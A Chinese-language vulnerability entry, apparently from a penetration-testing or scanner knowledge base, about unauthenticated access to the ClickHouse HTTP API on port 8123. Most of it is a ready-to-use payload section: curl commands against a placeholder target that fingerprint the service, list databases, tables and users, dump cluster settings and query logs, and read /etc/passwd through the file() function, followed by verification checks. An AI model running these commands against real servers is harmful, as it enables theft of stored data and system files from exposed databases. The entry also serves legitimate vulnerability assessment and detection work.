---
id: CLICKHOUSE-UNAUTH
title: ClickHouse HTTP API 未授权访问漏洞
product: clickhouse
vendor: ClickHouse Inc
version_affected: "all versions (misconfiguration)"
severity: HIGH
tags: [sqli, info_disclosure, 无需认证]
fingerprint: ["ClickHouse", "Ok."]
---

## 漏洞描述

ClickHouse 是一款高性能列式数据库，其 HTTP 接口（默认端口8123）在未配置认证的情况下允许任意用户直接执行 SQL 查询。攻击者可通过 HTTP API 执行任意 SQL 语句，读取数据库中所有数据，获取服务器配置信息，甚至通过特定函数读取服务器文件。

## 影响版本

- 所有未配置 HTTP 认证的 ClickHouse 实例

## 前置条件

- 无需认证（目标未配置 HTTP 接口认证）
- ClickHouse HTTP 端口可访问（默认8123）

## 利用步骤

1. 确认 ClickHouse HTTP 端口可访问（访问根路径返回 "Ok."）
2. 通过 URL 参数或 POST body 执行 SQL 查询
3. 枚举数据库、表和数据
4. 读取系统配置和敏感信息

## Payload

### 确认服务在线

```bash
curl -s http://target:8123/
# 返回 "Ok." 即为 ClickHouse HTTP 接口
```

### 列出所有数据库

```bash
curl -s "http://target:8123/?query=SHOW%20DATABASES"
```

### 列出所有表

```bash
curl -s "http://target:8123/?query=SELECT%20database,name,engine%20FROM%20system.tables%20FORMAT%20Pretty"
```

### 查询系统信息

```bash
# 查看版本
curl -s "http://target:8123/?query=SELECT%20version()"

# 查看集群配置
curl -s "http://target:8123/?query=SELECT%20*%20FROM%20system.clusters%20FORMAT%20Pretty"

# 查看用户
curl -s "http://target:8123/?query=SELECT%20*%20FROM%20system.users%20FORMAT%20Pretty"

# 查看查询日志（可能包含敏感查询）
curl -s "http://target:8123/?query=SELECT%20query,user,client_hostname%20FROM%20system.query_log%20LIMIT%2050%20FORMAT%20Pretty"
```

### 读取服务器文件（需要 file() 函数权限）

```bash
curl -s "http://target:8123/?query=SELECT%20*%20FROM%20file('/etc/passwd','RawBLOB')"
```

### 使用 POST 方式执行复杂查询

```bash
curl -s -X POST "http://target:8123/" \
  -d "SELECT database, name, total_rows, total_bytes FROM system.tables WHERE total_rows > 0 FORMAT Pretty"
```

## 验证方法

```bash
# 1. 确认未授权访问
curl -s http://target:8123/ | grep "Ok."

# 2. 执行 SQL 查询验证
curl -s "http://target:8123/?query=SELECT%20version()" | grep -E "^[0-9]"

# 3. 列出数据库
curl -s "http://target:8123/?query=SHOW%20DATABASES" | grep -v "^$"
```

## 指纹确认

```bash
# 根路径返回 "Ok."
curl -s http://target:8123/
# 返回 "Ok." 即为 ClickHouse

# 或通过 /ping 端点
curl -s http://target:8123/ping
# 返回 "Ok."
```
